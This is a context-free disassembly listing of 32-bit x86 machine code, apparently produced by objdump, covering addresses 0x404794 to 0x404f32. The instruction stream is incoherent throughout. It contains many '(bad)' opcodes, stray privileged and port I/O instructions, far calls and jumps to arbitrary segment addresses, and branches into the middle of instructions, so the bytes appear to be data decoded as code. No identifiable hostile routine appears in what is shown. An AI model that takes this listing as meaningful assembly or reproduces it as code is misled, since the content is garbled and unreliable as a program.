  404794:	mov    esi,0xd5287911
  404799:	lock sub ebx,DWORD PTR [ebx]
  40479c:	pop    ss
  40479d:	outs   dx,BYTE PTR ds:[esi]
  40479e:	rol    DWORD PTR [ecx-0x10],cl
  4047a1:	(bad)  [ecx]
  4047a3:	cmp    BYTE PTR [esi],ah
  4047a5:	cs xcrypt-cbc (bad)
  4047a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047a8:	xlat   BYTE PTR ds:[ebx]
  4047a9:	jne    0x40475c
  4047ab:	mov    ebp,edx
  4047ad:	out    0x12,al
  4047af:	cmp    eax,0x6de50683
  4047b4:	ds sti 
  4047b6:	push   edx
  4047b7:	sub    al,0xc5
  4047b9:	pushw  ds
  4047bb:	pop    ss
  4047bc:	mov    ah,0x78
  4047be:	push   ds
  4047bf:	or     DWORD PTR [eax-0x629ef13d],0x35214ff5
  4047c9:	jbe    0x4047f4
  4047cb:	hlt    
  4047cc:	mov    dh,0xbc
  4047ce:	jns    0x40479a
  4047d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047d1:	test   al,0xc1
  4047d3:	nop
  4047d4:	cmp    eax,0x74c73d48
  4047d9:	adc    BYTE PTR ds:[edx],bl
  4047dc:	aaa    
  4047dd:	add    DWORD PTR [eax],ebx
  4047df:	push   eax
  4047e0:	add    eax,0xf80c7f02
  4047e5:	repnz sidtd [edx]
  4047e9:	imul   esi,edi,0xffffff98
  4047ec:	daa    
  4047ed:	shr    BYTE PTR [eax+0x7e],1
  4047f0:	mov    DWORD PTR [ebp-0x5d],edx
  4047f3:	adc    al,0x7d
  4047f5:	in     al,dx
  4047f6:	into   
  4047f7:	(bad)  
  4047f9:	or     DWORD PTR [ecx+0x203908bd],0x21c69540
  404803:	les    edi,FWORD PTR [esi-0x5f]
  404806:	stos   DWORD PTR es:[di],eax
  404808:	int    0x97
  40480a:	jbe    0x404800
  40480c:	aas    
  40480d:	popa   
  40480e:	sbb    DWORD PTR ds:[edi],edx
  404811:	cpuid  
  404813:	push   esp
  404814:	mov    dl,0xaf
  404816:	xor    DWORD PTR [ebx-0x53],0xb42ddbbc
  40481d:	iret   
  40481e:	into   
  40481f:	add    al,0xa3
  404821:	jae    0x404887
  404823:	popa   
  404824:	cmp    eax,DWORD PTR [esi]
  404826:	jle    0x40484f
  404828:	outs   dx,BYTE PTR ds:[esi]
  404829:	cmp    esi,DWORD PTR [edx+0x2e7497e2]
  40482f:	popf   
  404830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404831:	ds pop ds
  404833:	out    0x8d,al
  404835:	mov    eax,0x8e91494b
  40483a:	push   cs
  40483b:	sbb    dl,BYTE PTR [esp-0x32]
  40483f:	std    
  404840:	cmp    eax,0xbdaa9ff6
  404845:	mov    esp,0x753790ce
  40484a:	int    0xc9
  40484c:	sbb    DWORD PTR [ebx+ecx*2-0x59],0x1497575
  404854:	outs   dx,DWORD PTR ds:[esi]
  404855:	dec    edx
  404856:	in     eax,0x56
  404858:	retf   0x2a7b
  40485b:	push   0x1970c717
  404860:	mov    ecx,0x151b1d85
  404865:	sbb    BYTE PTR [ecx-0x7edffffc],cl
  40486b:	inc    ecx
  40486c:	aaa    
  40486d:	mov    al,ds:0xc1ec2028
  404872:	out    dx,eax
  404873:	pop    esp
  404874:	mov    bl,0x64
  404876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404877:	test   DWORD PTR [ebp-0x29],esi
  40487a:	(bad)
  40487d:	jo     0x4048f5
  40487f:	aas    
  404880:	std    
  404881:	add    eax,0x18f114ed
  404886:	xor    DWORD PTR [ecx+0x311874af],0x2e1d3db1
  404890:	stc    
  404891:	mov    ah,0xdd
  404893:	xchg   edx,eax
  404894:	xchg   cl,dh
  404896:	sub    ebp,DWORD PTR [esi+ecx*2+0x49]
  40489a:	lock (bad) 
  40489c:	loop   0x4048cb
  40489e:	nop
  40489f:	inc    ecx
  4048a0:	xlat   BYTE PTR ds:[ebx]
  4048a1:	jmp    0xd8a4971d
  4048a6:	or     ebp,DWORD PTR [eax+0x369f6b4b]
  4048ac:	rcr    BYTE PTR [ecx+0xe],cl
  4048af:	call   0xb9cacb3c
  4048b4:	and    DWORD PTR [ebx+0x3b90f4f2],ecx
  4048ba:	jmp    DWORD PTR [eax]
  4048bc:	lock adc DWORD PTR [ebx-0x79],eax
  4048c0:	and    ebp,DWORD PTR [edi-0x6400e3d0]
  4048c6:	mov    ds:0x6fe94ddc,al
  4048cb:	add    cl,BYTE PTR [edi+0x71d8e0a0]
  4048d1:	cmp    eax,0xb2e03100
  4048d6:	pop    esi
  4048d7:	cli    
  4048d8:	or     eax,0x940393f0
  4048dd:	and    edi,ebp
  4048df:	repz dec ebp
  4048e1:	fmul   DWORD PTR [edi]
  4048e3:	jo     0x404914
  4048e5:	mov    esi,0xbd85a120
  4048ea:	push   cs
  4048eb:	mov    edi,0x749436b4
  4048f0:	(bad)  
  4048f1:	pop    ds
  4048f2:	dec    ebx
  4048f3:	dec    edi
  4048f4:	mov    ch,0xb
  4048f6:	xor    eax,0x10edc4a4
  4048fb:	jp     0x4048d0
  4048fd:	cmc    
  4048fe:	push   ecx
  4048ff:	jns    0x40495e
  404901:	xlat   BYTE PTR ds:[ebx]
  404902:	sub    cl,BYTE PTR [edx]
  404904:	dec    edi
  404905:	dec    ecx
  404906:	mov    eax,0x371aa665
  40490b:	ins    BYTE PTR es:[edi],dx
  40490c:	adc    DWORD PTR [edx-0x781d535d],edx
  404912:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  404914:	dec    ebx
  404915:	adc    bh,BYTE PTR [eax-0x13b2aeb2]
  40491b:	push   ebp
  40491c:	and    esp,DWORD PTR [eax]
  40491e:	mov    ebp,0x8040a8c9
  404923:	xor    eax,esi
  404925:	or     edx,ebx
  404927:	lods   eax,DWORD PTR ds:[esi]
  404928:	lods   eax,DWORD PTR ds:[esi]
  404929:	es jbe 0x404945
  40492c:	clc    
  40492d:	lds    edx,FWORD PTR [edi+edi*1-0x15bf3554]
  404934:	cwde   
  404935:	out    0xfa,al
  404937:	mov    ch,0x1f
  404939:	and    bl,BYTE PTR [edx-0x7ac960f4]
  40493f:	jmp    0xfb723eaa
  404944:	pop    ebp
  404945:	dec    ecx
  404946:	mov    al,ds:0x5513ff0e
  40494b:	jo     0x40497e
  40494d:	or     DWORD PTR [ecx-0x53],ebp
  404950:	mov    DWORD PTR [edx],ecx
  404952:	jecxz  0x4049c3
  404954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404955:	push   edi
  404956:	div    DWORD PTR [ebp-0x1b]
  404959:	or     BYTE PTR [edx-0x36],dh
  40495c:	test   eax,ebx
  40495e:	xor    DWORD PTR [eax+0xa],ebp
  404961:	sub    al,0x62
  404963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404964:	pop    edi
  404965:	push   es
  404966:	lea    edi,[ebx]
  404968:	fidivr WORD PTR [ebx]
  40496a:	clc    
  40496b:	dec    edi
  40496c:	mov    al,0xfa
  40496e:	inc    edx
  40496f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404970:	inc    edi
  404971:	pop    eax
  404972:	sahf   
  404973:	jmp    0x4049b3
  404975:	mov    ebp,0xf476081f
  40497a:	mov    ah,0x22
  40497c:	outs   dx,DWORD PTR ds:[esi]
  40497d:	xlat   BYTE PTR ds:[ebx]
  40497e:	mov    ebx,0x94bc4a3c
  404983:	sbb    BYTE PTR [eax+0x2e0f4e10],dl
  404989:	retf   0xadd9
  40498c:	mov    edi,DWORD PTR [ecx+0x337cb45]
  404992:	push   0x69
  404994:	or     al,0x6
  404996:	add    DWORD PTR [edi],0xc6023869
  40499c:	nop
  40499d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40499e:	sbb    ebp,DWORD PTR [edi]
  4049a0:	ret    
  4049a1:	repnz inc eax
  4049a3:	cld    
  4049a4:	gs (bad) 
  4049a6:	clc    
  4049a7:	xchg   BYTE PTR [edx+0x2e928058],dh
  4049ad:	mov    dl,0x5
  4049af:	and    DWORD PTR [esi],edx
  4049b1:	loop   0x4049a3
  4049b3:	mov    ah,BYTE PTR [esi+0x24035ef1]
  4049b9:	push   esp
  4049ba:	sub    BYTE PTR [edx+edi*8],al
  4049bd:	cmp    eax,0x170c373c
  4049c2:	scas   al,BYTE PTR es:[edi]
  4049c3:	jmp    0x6b5f:0x2bb06e34
  4049ca:	sti    
  4049cb:	fwait
  4049cc:	mov    dl,0x8
  4049ce:	and    eax,0x5666aa5b
  4049d3:	int    0xf4
  4049d5:	les    ecx,FWORD PTR [ecx-0x296e8517]
  4049db:	inc    edi
  4049dc:	les    ebp,FWORD PTR [ebp+0x11]
  4049df:	and    eax,0x1ad1ca80
  4049e4:	jp     0x404a30
  4049e6:	in     eax,dx
  4049e7:	jo     0x4049db
  4049e9:	adc    al,0x72
  4049eb:	aas    
  4049ec:	ins    BYTE PTR es:[edi],dx
  4049ed:	jne    0x4049ea
  4049ef:	dec    ebx
  4049f0:	dec    bl
  4049f2:	jmp    0x3e5d:0xabfa59e
  4049f9:	dec    esi
  4049fa:	xor    ebp,DWORD PTR ds:[esi+0x4c2df721]
  404a01:	(bad)  
  404a02:	call   0xc316:0xfe52ebcb
  404a09:	mov    ecx,0x485192ab
  404a0e:	sbb    eax,0x97299665
  404a13:	xor    dh,cl
  404a15:	retf   
  404a16:	ins    DWORD PTR es:[edi],dx
  404a17:	adc    ebx,0x9d66c70a
  404a1d:	sbb    DWORD PTR [edx+0x2c047edf],0xffffffb9
  404a24:	js     0x4049b8
  404a26:	fimul  DWORD PTR [edx]
  404a28:	popa   
  404a29:	stos   BYTE PTR es:[edi],al
  404a2a:	mov    cl,0x86
  404a2c:	push   edx
  404a2d:	or     eax,0x6d26dc0
  404a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a33:	loope  0x404a4f
  404a35:	fwait
  404a36:	sub    edx,DWORD PTR [edx]
  404a38:	ins    BYTE PTR es:[edi],dx
  404a39:	xchg   edi,eax
  404a3a:	loop   0x404a23
  404a3c:	cld    
  404a3d:	je     0x404abd
  404a3f:	inc    edi
  404a40:	fidiv  DWORD PTR [ecx+0xd]
  404a43:	loope  0x404a0d
  404a45:	stos   BYTE PTR es:[edi],al
  404a46:	jp     0x404a09
  404a48:	cld    
  404a49:	out    dx,eax
  404a4a:	inc    esp
  404a4b:	test   eax,0x680ce51c
  404a50:	mov    DWORD PTR [ebx-0x6c],0x5dddafad
  404a57:	xchg   BYTE PTR [eax],bh
  404a59:	ss xor al,0xe8
  404a5c:	sahf   
  404a5d:	loop   0x4049f6
  404a5f:	pop    esi
  404a60:	jp     0x404a1d
  404a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a63:	(bad)  
  404a65:	mov    edx,?
  404a67:	lods   eax,DWORD PTR ds:[esi]
  404a68:	xchg   DWORD PTR [edi],ebp
  404a6a:	cwde   
  404a6b:	sti    
  404a6c:	les    ebp,FWORD PTR [ebx-0x4d]
  404a6f:	enter  0xd87d,0x12
  404a73:	xchg   ebx,eax
  404a74:	loopne 0x404ac7
  404a76:	inc    esi
  404a77:	repnz stos BYTE PTR es:[edi],al
  404a79:	jg     0x404abe
  404a7b:	retf   0x7e8f
  404a7e:	int    0x59
  404a80:	sahf   
  404a81:	mov    edx,0x98c1f322
  404a86:	sub    eax,0xb35d52f3
  404a8b:	enter  0x21f5,0xe7
  404a8f:	sbb    DWORD PTR [ecx],edi
  404a91:	and    BYTE PTR [ecx-0x43],al
  404a94:	push   0x82be97d9
  404a99:	cld    
  404a9a:	inc    edi
  404a9b:	mov    ecx,0x2cdff2f6
  404aa0:	sar    DWORD PTR [ecx+0x56],0x3c
  404aa4:	adc    bl,ah
  404aa6:	pop    esi
  404aa7:	pop    ecx
  404aa8:	arpl   WORD PTR [edi-0x24],si
  404aab:	cmc    
  404aac:	and    esp,DWORD PTR fs:[edx+0x18128369]
  404ab3:	enter  0xb1fb,0x4
  404ab7:	mov    WORD PTR ds:[edx-0x59],es
  404abb:	and    BYTE PTR [esi-0x5d],al
  404abe:	retf   0x68c6
  404ac1:	in     eax,dx
  404ac2:	or     BYTE PTR [eax+0x41],cl
  404ac5:	ret    
  404ac6:	hlt    
  404ac7:	mov    cl,0x37
  404ac9:	in     eax,0x9b
  404acb:	push   0xb6e34ebe
  404ad0:	push   cs
  404ad1:	push   0x4b484235
  404ad6:	popa   
  404ad7:	mov    ebp,0x335f8555
  404adc:	jb     0x404b45
  404ade:	jns    0x404ab4
  404ae0:	add    cl,BYTE PTR [edi+0x2c6c4a8a]
  404ae6:	lahf   
  404ae7:	mov    esi,0xad02f35
  404aec:	popa   
  404aed:	nop
  404aee:	inc    edi
  404aef:	hlt    
  404af0:	jge    0x404b10
  404af2:	add    eax,eax
  404af4:	cs popa 
  404af6:	dec    esp
  404af7:	and    ebp,edx
  404af9:	push   edi
  404afa:	xchg   BYTE PTR [esi+0x79d01d28],al
  404b00:	mov    edx,0x7f7f10e4
  404b05:	ins    DWORD PTR es:[edi],dx
  404b06:	out    dx,al
  404b07:	jmp    0x6c6f9a6d
  404b0c:	sbb    al,0xee
  404b0f:	push   edx
  404b10:	repz cmp ebx,DWORD PTR [ebx]
  404b13:	js     0x404b36
  404b15:	adc    ah,ch
  404b17:	or     BYTE PTR [edi-0x11],ch
  404b1a:	mov    dh,0xfa
  404b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b1d:	mov    ds:0x7e75ca82,al
  404b22:	adc    BYTE PTR [ebx+eax*8],ch
  404b25:	add    eax,0x5400b3ad
  404b2a:	in     eax,dx
  404b2b:	cld    
  404b2c:	rcr    BYTE PTR [ecx+0x4c3c8d9c],cl
  404b32:	fwait
  404b33:	inc    eax
  404b34:	add    eax,0x2ba8c029
  404b39:	pop    edx
  404b3a:	xchg   BYTE PTR [ebp+eiz*2-0x4d],ch
  404b3e:	mov    ah,0xd3
  404b40:	mov    ebp,0x9985f8d7
  404b45:	mov    cl,0x75
  404b47:	jns    0x404b20
  404b49:	jecxz  0x404baa
  404b4b:	leave  
  404b4c:	mov    bl,0x18
  404b4e:	lods   eax,DWORD PTR ds:[esi]
  404b4f:	fsubr  QWORD PTR [ecx+0x2175a6dc]
  404b55:	mov    bh,0xa6
  404b58:	repnz push ss
  404b5a:	mov    esp,0xbac57e27
  404b5f:	sub    al,0x50
  404b61:	mov    eax,ds:0xc2198135
  404b66:	shl    BYTE PTR [esi],cl
  404b68:	xchg   edi,eax
  404b69:	rdpmc  
  404b6b:	xor    bh,bh
  404b6d:	out    0x64,al
  404b6f:	(bad)  
  404b70:	call   FWORD PTR [esi+0x3b6beeb2]
  404b76:	pop    esi
  404b77:	mov    edx,0xed37c3cd
  404b7c:	mov    ebx,0x8aafd3e8
  404b81:	push   edx
  404b82:	inc    esi
  404b83:	adc    ecx,DWORD PTR [eax-0x1a4cdcfe]
  404b89:	nop
  404b8a:	jbe    0x404bd8
  404b8c:	inc    ecx
  404b8d:	jle    0x404b94
  404b8f:	mov    ebp,0x8a97c241
  404b94:	push   DWORD PTR [edi+ebp*4+0x60]
  404b98:	sti    
  404b99:	xchg   esp,eax
  404b9a:	or     dh,BYTE PTR [eax]
  404b9c:	adc    BYTE PTR [ecx-0x3d0aeb03],ch
  404ba2:	inc    edx
  404ba3:	int3   
  404ba4:	mov    ebp,0xd87fab13
  404ba9:	shl    BYTE PTR [ebp-0x406cb232],1
  404baf:	retf   
  404bb0:	std    
  404bb1:	xchg   edx,eax
  404bb2:	mov    edi,0xbd603ac7
  404bb7:	test   BYTE PTR [ebp+edx*4-0x2c],cl
  404bbb:	test   BYTE PTR [edx-0x45],ah
  404bbe:	push   cs
  404bbf:	dec    ebx
  404bc0:	sbb    bh,cl
  404bc2:	inc    esp
  404bc3:	dec    ebx
  404bc4:	stos   BYTE PTR es:[edi],al
  404bc5:	jnp    0x404bc1
  404bc7:	(bad)  
  404bc8:	pop    ss
  404bc9:	pop    edi
  404bca:	or     bl,BYTE PTR [edi+eiz*2+0x39]
  404bce:	sbb    DWORD PTR [ebp+0x27eb2a83],0xffffffb9
  404bd5:	retf   0x7382
  404bd8:	dec    esi
  404bd9:	xchg   ebx,eax
  404bda:	dec    esp
  404bdb:	fisubr DWORD PTR [edx-0xa]
  404bde:	inc    ecx
  404bdf:	pop    eax
  404be0:	xlat   BYTE PTR ds:[ebx]
  404be1:	adc    al,0xfe
  404be3:	xchg   edi,eax
  404be4:	mov    dl,0x18
  404be6:	dec    edx
  404be7:	js     0x404bd0
  404be9:	mov    bh,BYTE PTR [ecx]
  404beb:	pop    esp
  404bec:	fcmovnb st,st(7)
  404bee:	cli    
  404bef:	xchg   esp,eax
  404bf0:	push   esp
  404bf1:	and    bh,BYTE PTR [edi-0x1a2ed41b]
  404bf7:	mov    bh,0x37
  404bf9:	mov    ebx,0xad9fcc37
  404bfe:	mov    ch,0x38
  404c00:	mov    ebp,0x4b074bd4
  404c05:	rcr    al,cl
  404c07:	call   0x3171fc1c
  404c0c:	xchg   edi,eax
  404c0d:	pop    DWORD PTR [ecx]
  404c0f:	xor    DWORD PTR [edx+0x29],esp
  404c12:	ret    
  404c13:	and    BYTE PTR [esp+ebx*1-0x28],0x22
  404c18:	test   BYTE PTR [eax-0x533ef027],cl
  404c1e:	daa    
  404c1f:	popf   
  404c20:	retf   0x255f
  404c23:	mov    ebp,0x13ab7986
  404c28:	dec    esi
  404c29:	int3   
  404c2a:	sbb    ah,cl
  404c2c:	xor    esp,edx
  404c2e:	mov    edx,DWORD PTR [ecx]
  404c30:	mov    edx,DWORD PTR [esi+edi*8]
  404c33:	inc    ecx
  404c34:	je     0x404c98
  404c36:	dec    esi
  404c37:	ds mov dl,0x3c
  404c3a:	jo     0x404c67
  404c3c:	sbb    al,0x76
  404c3e:	retf   
  404c3f:	pop    esi
  404c40:	test   DWORD PTR [eax-0x3ea890fe],ebp
  404c46:	xor    DWORD PTR [esi],ecx
  404c48:	xchg   ecx,eax
  404c49:	push   es
  404c4a:	mov    ch,0x6f
  404c4c:	das    
  404c4d:	or     DWORD PTR [edi],0xe770a7d1
  404c53:	data16 xor BYTE PTR [eax+0x7f],cl
  404c57:	mov    dh,0xcd
  404c59:	in     al,0x83
  404c5b:	shl    DWORD PTR [esi-0x72a2d623],cl
  404c61:	jne    0x404cb9
  404c63:	repnz xchg esp,eax
  404c65:	mov    cl,BYTE PTR [ecx-0x2d52eaa7]
  404c6b:	push   ss
  404c6c:	lahf   
  404c6d:	push   esi
  404c6e:	fsubr  DWORD PTR [edi+0x2f]
  404c71:	stos   BYTE PTR es:[edi],al
  404c72:	pop    ecx
  404c73:	stos   BYTE PTR es:[edi],al
  404c74:	cmc    
  404c75:	neg    DWORD PTR [ebx]
  404c77:	jb     0x404c5f
  404c79:	mov    ebp,0x42734ddf
  404c7e:	icebp  
  404c7f:	jno    0x404cb3
  404c81:	mov    esp,0x576ce419
  404c86:	dec    ecx
  404c87:	call   0x354c:0xa7268ede
  404c8e:	push   esp
  404c8f:	(bad)  
  404c90:	push   ss
  404c91:	or     esi,DWORD PTR [edi-0xd314762]
  404c97:	daa    
  404c98:	mov    ch,0xbd
  404c9a:	jne    0x404c8f
  404c9c:	cmp    BYTE PTR [ebp+0x5e],dh
  404c9f:	pop    esp
  404ca0:	mov    dh,0x8e
  404ca2:	sbb    eax,esi
  404ca4:	test   eax,0x7700541b
  404ca9:	or     ebp,DWORD PTR [ecx]
  404cab:	inc    edx
  404cac:	cmp    BYTE PTR [edx+0x772901a2],bh
  404cb2:	cmp    ebx,0x90a72392
  404cb8:	das    
  404cb9:	(bad)  
  404cba:	mov    WORD PTR [edx+0x2b],ds
  404cbd:	sti    
  404cbe:	inc    ebx
  404cbf:	xchg   esi,eax
  404cc0:	(bad)  
  404cc1:	mov    BYTE PTR [ebx],cl
  404cc3:	das    
  404cc4:	je     0x404d42
  404cc6:	xchg   DWORD PTR [ecx],esi
  404cc8:	xchg   edx,eax
  404cc9:	pushf  
  404cca:	or     al,0x7
  404ccc:	jno    0x404cd4
  404cce:	daa    
  404ccf:	sub    al,0xab
  404cd1:	dec    eax
  404cd2:	jno    0x404d1c
  404cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cd5:	test   DWORD PTR [edi+edi*4-0xb625cf0],ebx
  404cdc:	add    eax,0x4ca93ab1
  404ce1:	add    al,0xcc
  404ce3:	pop    ds
  404ce4:	pop    ebx
  404ce5:	mov    dl,0x32
  404ce7:	and    ecx,DWORD PTR [edx+0x54]
  404cea:	ins    BYTE PTR es:[edi],dx
  404ceb:	xor    al,0xa9
  404ced:	pop    ebp
  404cee:	push   edx
  404cef:	jne    0x404cc6
  404cf1:	jne    0x404cd9
  404cf3:	ss xchg ebp,eax
  404cf5:	call   FWORD PTR [esi]
  404cf7:	cwde   
  404cf8:	jg     0x404cfb
  404cfa:	stos   DWORD PTR es:[edi],eax
  404cfb:	xor    cl,BYTE PTR [ebp-0x2f]
  404cfe:	lds    esp,FWORD PTR [esi-0x3d]
  404d01:	mov    al,0x2b
  404d03:	or     al,0x38
  404d05:	loop   0x404cdb
  404d07:	add    eax,0x23d11dd7
  404d0c:	push   edx
  404d0d:	sub    edx,esp
  404d0f:	xchg   edi,eax
  404d10:	mov    esi,0x6d3c1a7a
  404d15:	ret    0x3176
  404d18:	in     al,dx
  404d19:	xchg   edx,eax
  404d1a:	aad    0x4c
  404d1c:	or     dh,BYTE PTR [ebp+0x50fbbe79]
  404d22:	push   edx
  404d23:	add    esi,DWORD PTR [ecx-0x19a5ddca]
  404d29:	jns    0x404cf6
  404d2b:	mov    al,0xab
  404d2d:	cmp    eax,0xd432cab7
  404d32:	shl    BYTE PTR [ecx+0x24],0xc9
  404d36:	(bad)  
  404d38:	int    0x62
  404d3a:	aad    0x6c
  404d3c:	push   es
  404d3d:	add    bl,dh
  404d3f:	push   esp
  404d40:	call   0x3ac6:0x7732db82
  404d47:	xchg   BYTE PTR [edx],bh
  404d49:	sbb    edi,eax
  404d4b:	into   
  404d4c:	imul   eax,edi,0x3a
  404d4f:	rcr    edi,1
  404d51:	into   
  404d52:	test   BYTE PTR [ecx],cl
  404d54:	or     DWORD PTR [edx],esi
  404d56:	sub    BYTE PTR [edx+0x44],bl
  404d59:	repz aaa 
  404d5b:	out    dx,eax
  404d5c:	xchg   DWORD PTR [esp+edx*4+0x35364c29],ebp
  404d63:	push   0xffffffe2
  404d65:	mov    al,0xa7
  404d67:	sbb    DWORD PTR [eax+0x57211f39],edi
  404d6d:	pop    ss
  404d6e:	scas   eax,DWORD PTR es:[edi]
  404d6f:	jg     0x404d54
  404d71:	jg     0x404dba
  404d73:	mov    DWORD PTR [ecx-0x21f9e3b7],esi
  404d79:	dec    edx
  404d7a:	and    DWORD PTR [edx+esi*8],edx
  404d7d:	inc    esi
  404d7e:	aaa    
  404d7f:	into   
  404d80:	(bad)  
  404d81:	daa    
  404d82:	popa   
  404d83:	ins    BYTE PTR es:[edi],dx
  404d84:	mov    dl,0xbf
  404d86:	push   edi
  404d87:	js     0x404d69
  404d89:	jle    0x404dd3
  404d8b:	call   0x1f021190
  404d90:	jne    0x404d97
  404d92:	imul   eax,DWORD PTR [edi+0x76],0xffffffce
  404d96:	mov    es,WORD PTR [ecx]
  404d98:	call   0x19b47860
  404d9d:	cli    
  404d9e:	mov    dh,0x54
  404da0:	retf   
  404da1:	inc    esp
  404da2:	xor    DWORD PTR [ebp-0x371cdc62],edi
  404da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404da9:	inc    edx
  404daa:	js     0x404e25
  404dac:	popa   
  404dad:	push   ds
  404dae:	icebp  
  404daf:	and    al,0xd0
  404db1:	fcmove st,st(5)
  404db3:	mov    eax,DWORD PTR [esi]
  404db5:	into   
  404db6:	mov    esp,edi
  404db8:	and    DWORD PTR ds:0x6b9c1851,eax
  404dbe:	jge    0x404d8b
  404dc0:	and    DWORD PTR [edx],0xb3b7990f
  404dc6:	sub    DWORD PTR [esi+0x41],ebx
  404dc9:	iret   
  404dca:	or     DWORD PTR [ebx],edi
  404dcc:	popf   
  404dcd:	sub    BYTE PTR ds:0xee5e64e,dh
  404dd3:	fnstenv [edi+eax*8]
  404dd6:	xchg   edx,eax
  404dd7:	ins    BYTE PTR es:[edi],dx
  404dd8:	dec    ebp
  404dd9:	fcom   DWORD PTR cs:[eax+0x75]
  404ddd:	adc    al,0x13
  404ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404de0:	adc    esp,DWORD PTR ds:[ebp+0x7d]
  404de4:	sub    al,0x3b
  404de6:	pop    ss
  404de7:	int    0x5a
  404de9:	out    dx,eax
  404dea:	push   ds
  404deb:	jns    0x404e11
  404ded:	and    al,0x21
  404def:	test   al,0x0
  404df1:	sub    DWORD PTR ds:0x1fef351,esi
  404df7:	push   0xc6098ca9
  404dfc:	mov    esp,0x2ade9f1d
  404e01:	mov    al,ds:0x3bbd21b3
  404e06:	lds    ecx,FWORD PTR [edi+0x3f]
  404e09:	sub    eax,0xe597aab3
  404e0e:	ins    BYTE PTR es:[edi],dx
  404e0f:	retf   
  404e10:	jo     0x404e91
  404e12:	push   edi
  404e13:	jns    0x404dc9
  404e15:	mov    ecx,0x86797b55
  404e1a:	(bad)
  404e1f:	(bad)  
  404e20:	clc    
  404e21:	scas   eax,DWORD PTR es:[edi]
  404e22:	sub    eax,0x8eec641
  404e27:	sub    eax,0xebeb4c95
  404e2c:	push   es
  404e2d:	jne    0x404e7b
  404e2f:	or     eax,0x337f4528
  404e34:	lds    ebp,FWORD PTR [eax-0x2c3c501f]
  404e3a:	daa    
  404e3b:	ror    dl,0x78
  404e3e:	gs mov esp,0x954f6eb6
  404e44:	sub    bl,ch
  404e46:	mov    esp,0xf15e3580
  404e4b:	jo     0x404e41
  404e4d:	dec    ebp
  404e4e:	fistp  DWORD PTR [ecx-0x44f68f71]
  404e54:	cli    
  404e55:	sub    al,0xb0
  404e57:	jg     0x404df6
  404e59:	fcmovu st,st(2)
  404e5b:	mov    BYTE PTR [eax+0x97c6a96],bl
  404e61:	sub    ah,BYTE PTR [edi]
  404e63:	push   ebp
  404e64:	jns    0x404e9a
  404e66:	fwait
  404e67:	inc    esp
  404e68:	arpl   WORD PTR [edi+0xa],ax
  404e6b:	mov    bl,0x8f
  404e6d:	pop    edx
  404e6e:	stos   BYTE PTR es:[edi],al
  404e6f:	inc    ebp
  404e70:	ins    BYTE PTR es:[edi],dx
  404e71:	mov    dh,0x72
  404e73:	ss dec edi
  404e75:	retf   0x19d
  404e78:	jge    0x404dff
  404e7a:	jle    0x404ee0
  404e7c:	mov    eax,ds:0x9dce6173
  404e81:	mov    eax,0xe2c766c0
  404e86:	push   edx
  404e87:	pop    ecx
  404e88:	inc    edx
  404e89:	pusha  
  404e8a:	stc    
  404e8b:	push   ebp
  404e8c:	add    DWORD PTR [edx],ecx
  404e8e:	xor    al,0x37
  404e90:	xchg   esp,ebp
  404e92:	ss das 
  404e94:	or     al,0x9e
  404e96:	mov    ds:0x57e35f34,eax
  404e9b:	xor    bh,cl
  404e9d:	add    eax,0xe0d64ba5
  404ea2:	inc    esi
  404ea3:	and    al,0xae
  404ea5:	xchg   esp,eax
  404ea6:	push   es
  404ea7:	sbb    eax,0x64a04256
  404eac:	shl    BYTE PTR [ecx+0x7986c270],0xc5
  404eb3:	jae    0x404e53
  404eb5:	or     al,0x66
  404eb7:	and    DWORD PTR [ebx+0x6e],0x86488a4c
  404ebe:	popf   
  404ebf:	icebp  
  404ec0:	sahf   
  404ec1:	dec    esp
  404ec2:	out    dx,eax
  404ec3:	xor    al,0x2a
  404ec5:	std    
  404ec6:	ds out dx,eax
  404ec8:	icebp  
  404ec9:	fidivr WORD PTR [ebx-0x10d96b93]
  404ecf:	(bad)  
  404ed0:	lods   al,BYTE PTR ds:[esi]
  404ed1:	dec    edx
  404ed2:	pop    ebp
  404ed3:	cdq    
  404ed4:	addr16 enter 0xcdfc,0x16
  404ed9:	lods   al,BYTE PTR ds:[esi]
  404eda:	sbb    esi,ebx
  404edc:	sbb    BYTE PTR [eax+ebp*1],dh
  404edf:	mov    al,ds:0xbc946b71
  404ee4:	dec    edi
  404ee5:	pop    edx
  404ee6:	push   edx
  404ee7:	je     0x404e69
  404ee9:	and    al,al
  404eeb:	cmp    eax,DWORD PTR [ebp-0x38b03d9f]
  404ef1:	mov    ebp,0xae18b0ef
  404ef6:	ds push eax
  404ef8:	out    dx,eax
  404ef9:	push   eax
  404efa:	imul   ebx,DWORD PTR [edi],0xe4801792
  404f00:	fs push ecx
  404f02:	sti    
  404f03:	stos   BYTE PTR es:[edi],al
  404f04:	or     BYTE PTR [esi+0x33],bh
  404f07:	adc    edx,DWORD PTR [ebp+0x76]
  404f0a:	add    edx,esp
  404f0c:	add    DWORD PTR [ebx-0x3a2b9c0b],esp
  404f12:	xor    bl,BYTE PTR [edi]
  404f14:	imul   edx,DWORD PTR [ebp-0x76],0xffffff96
  404f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f19:	addr16 mov ecx,0x501eb706
  404f1f:	outs   dx,DWORD PTR ds:[esi]
  404f20:	xchg   BYTE PTR [edi],dh
  404f22:	lods   al,BYTE PTR ds:[esi]
  404f23:	loop   0x404f26
  404f25:	pushf  
  404f26:	in     eax,dx
  404f27:	or     al,0xf3
  404f29:	stos   BYTE PTR es:[edi],al
  404f2a:	addr16 ss cmp eax,edx
  404f2e:	pusha  
  404f2f:	xlat   BYTE PTR ds:[ebx]
  404f30:	jno    0x404f16
  404f32:	jae    0x404f07
